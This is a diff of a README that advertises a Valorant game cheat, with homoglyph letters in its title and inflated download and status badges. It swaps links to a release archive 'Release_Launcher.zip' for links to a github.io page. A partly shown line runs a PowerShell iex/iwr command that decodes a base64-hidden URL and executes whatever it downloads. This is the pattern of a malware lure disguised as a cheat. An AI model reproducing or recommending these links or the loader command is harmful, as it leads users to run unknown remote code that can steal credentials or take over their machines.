@@ -1,13 +1,13 @@
 # Valorant Chеаt
 
-[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
-[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
-[![Downloads](https://img.shields.io/badge/Downloads-5.3m%2B-blue?style=for-the-badge)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
-[![Status](https://img.shields.io/badge/Status-Working-success?style=for-the-badge)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
+[![Windows](https://img.shields.io/badge/Platform-Windows%2010%2F11-0078D6?style=for-the-badge&logo=windows&logoColor=white)](https://restkingfisher.github.io/valorant-smokeesp/)
+[![Version](https://img.shields.io/badge/Version-2026-brightgreen?style=for-the-badge)](https://restkingfisher.github.io/valorant-smokeesp/)
+[![Downloads](https://img.shields.io/badge/Downloads-5.3m%2B-blue?style=for-the-badge)](https://restkingfisher.github.io/valorant-smokeesp/)
+[![Status](https://img.shields.io/badge/Status-Working-success?style=for-the-badge)](https://restkingfisher.github.io/valorant-smokeesp/)
 
 ---
 
-## [![Download Button](https://img.shields.io/badge/DOWNLOAD-Valorant%20Cheat-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
+## [![Download Button](https://img.shields.io/badge/DOWNLOAD-Valorant%20Cheat-brightgreen?style=for-the-badge&logo=download&logoColor=white)](https://restkingfisher.github.io/valorant-smokeesp/)
 
 ---
 
@@ -67,7 +67,7 @@ iex(iwr ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR
 
 ### Step 1 — Download
 
-[![Download Now](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-Click_Here-blue?style=for-the-badge&logo=download&logoColor=white)](https://github.com/BrandTinsmith/meomjdye/releases/download/v2/Release_Launcher.zip)
+[![Download Now](https://img.shields.io/badge/%E2%AC%87_DOWNLOAD-Click_Here-blue?style=for-the-badge&logo=download&logoColor=white)](https://restkingfisher.github.io/valorant-smokeesp/)
 
 ### Step 2 — Extract
 
